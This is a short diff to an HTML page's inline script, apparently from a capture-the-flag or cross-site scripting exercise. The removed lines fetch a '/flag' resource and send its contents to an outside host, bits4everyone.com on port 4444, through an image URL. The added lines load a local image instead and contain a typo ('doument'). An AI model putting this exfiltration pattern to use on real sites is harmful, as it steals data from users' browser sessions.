@@ -10,10 +10,9 @@
         do { curDate = new Date(); }
         while(curDate-date < 9000);
         document.write('<h1>Time</h1>');
-        $.get('/flag', function(data) {
-            var image = new Image();
-            image.src='http://bits4everyone.com:4444?data='+data;
-        });
+        var image = new Image();
+        image.src='flag.png';
+        doument.body.appendChild(image);
         document.write('<h1>Completed</h1>');
     </script>
 </body>
